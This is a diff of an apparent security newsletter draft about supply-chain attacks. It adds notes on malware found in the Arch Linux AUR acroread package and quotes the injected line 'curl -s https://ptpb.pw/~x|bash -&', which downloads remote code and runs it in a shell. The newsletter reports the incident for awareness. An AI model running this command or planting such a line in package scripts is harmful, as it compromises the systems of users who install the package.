@@ -1,7 +1,23 @@
 ---
 layout: email
-title: Blacklisting vs Whitelisting, Gentoo, and Ticketmaster UK
+title: Supply-chain attacks: Gentoo, Arch, and Ticketmaster UK
 ---
+
+Follow-up to previous KATTFAKTA - mention that risk based has the issue where company just accepts risks even if it shouldn’t
+
+
+This commit:
+https://aur.archlinux.org/cgit/aur.git/commit/?h=acroread&id=b3fec9f2f16703c2dae9e793f75ad6e0d98509bc
+
+Right at the bottom, the line 
+```
+curl -s https://ptpb.pw/~x|bash -&
+```
+has been added 
+
+https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/
+
+
 
 Good morning.
 
